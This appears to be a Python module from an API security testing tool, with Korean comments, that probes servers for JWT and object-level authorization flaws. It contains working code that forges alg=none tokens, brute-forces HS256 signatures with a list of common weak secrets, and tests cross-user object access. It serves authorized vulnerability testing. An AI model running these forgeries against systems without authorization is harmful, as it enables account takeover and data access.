"""BOLA, BFLA, Mass Assignment, JWT — active probing. `oracles/generic.py` 로 판정한다."""
from __future__ import annotations

import base64
import hashlib
import hmac
import json

from finredteam.oracles.base import OracleOutcome, unknown
from finredteam.oracles.generic import check_bola_signature, check_jwt_forgery, check_jwt_none_alg
from finredteam.probing.session import Session, SessionError

# Black-box 약한 시크릿 사전 — 흔한 기본/약한 JWT 서명키. 소스에서 훔친 게 아니라
# 공개적으로 흔한 값들이다(패스워드 스프레이와 같은 취지). vuln-bank 의 secret123 도
# 이런 흔한 값 중 하나라 사전으로 잡힌다.
_COMMON_JWT_SECRETS = (
    "secret", "secret123", "secretkey", "changeme", "password", "jwt_secret",
    "your-256-bit-secret", "supersecret", "admin", "test", "key", "123456",
)


def _b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def forge_hs256_token(payload: dict, secret: str) -> str:
    """주어진 시크릿으로 HS256 서명한 JWT 를 만든다 — 약한/기본 시크릿이면 서버가
    정상 토큰으로 받아들인다(서명 위조)."""
    header = _b64url(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
    body = _b64url(json.dumps(payload).encode())
    signing_input = f"{header}.{body}".encode()
    sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
    return f"{header}.{body}.{_b64url(sig)}"


def forge_none_alg_token(payload: dict) -> str:
    """서명 없는(alg=none) JWT 를 위조한다 — 서버가 이를 수락하는지 시험."""
    header = _b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
    body = _b64url(json.dumps(payload).encode())
    return f"{header}.{body}."


def probe_jwt_none_alg(session: Session, protected_path: str, method: str, payload: dict) -> OracleOutcome:
    token = forge_none_alg_token(payload)
    try:
        ex = session.raw_token_request(method, protected_path, token)
    except SessionError:
        return unknown("G-JWT", "요청 실패")

    accepted = ex.status_code < 400
    return check_jwt_none_alg(accepted_unsigned=accepted, alg_header_mutable=True)


def probe_jwt_weak_secret(
    session: Session, protected_path: str, method: str, payload: dict, secrets_list=_COMMON_JWT_SECRETS
) -> OracleOutcome:
    """흔한 약한 시크릿 사전으로 HS256 토큰을 위조해, 서버가 수락하는 게 있는지 본다.
    하나라도 수락되면 G-JWT VIOLATION(서명키 추측으로 임의 토큰 위조 가능)."""
    for secret in secrets_list:
        token = forge_hs256_token(payload, secret)
        try:
            ex = session.raw_token_request(method, protected_path, token)
        except SessionError:
            continue
        if ex.status_code < 400:
            return check_jwt_forgery(accepted=True, weak_secret_found=secret)
    return check_jwt_forgery(accepted=False)


def probe_bola(
    session: Session, path: str, method: str, requester_principal, entitlement_known: bool | None
) -> OracleOutcome:
    """다른 주체의 식별자로 요청해서 200 이 반환되는지 본다. entitlement 확인은
    호출부(knowledge/graph.py 조회 결과)가 넘겨준다 — 이 함수는 네트워크만 담당한다.
    """
    try:
        ex = session.authed_request(method, path, requester_principal)
    except SessionError:
        return unknown("G-BOLA", "요청 실패")

    cross_principal_object_returned = ex.status_code < 400
    return check_bola_signature(cross_principal_object_returned, entitlement_known)
